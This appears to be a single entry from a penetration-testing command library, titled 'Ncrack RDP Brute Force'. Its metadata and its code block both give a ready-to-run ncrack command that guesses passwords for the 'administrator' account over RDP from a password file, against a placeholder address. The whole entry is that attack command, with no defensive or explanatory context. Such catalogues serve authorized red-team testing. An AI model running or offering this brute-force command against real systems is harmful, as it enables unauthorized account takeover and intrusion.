---
id: cf9afb3f-423a-4902-8313-9f007fd03404
name: Ncrack RDP Brute Force
type: command
executor: bash
data: ncrack --connection-limit 1 -vv --user administrator -P password-file.txt rdp://10.10.10.10
output: null
created_at: '2023-04-06T03:56:04.330963+00:00'
updated_at: '2023-04-10T20:25:55.680618+00:00'
---

# Ncrack RDP Brute Force

```bash
ncrack --connection-limit 1 -vv --user administrator -P password-file.txt rdp://10.10.10.10
```
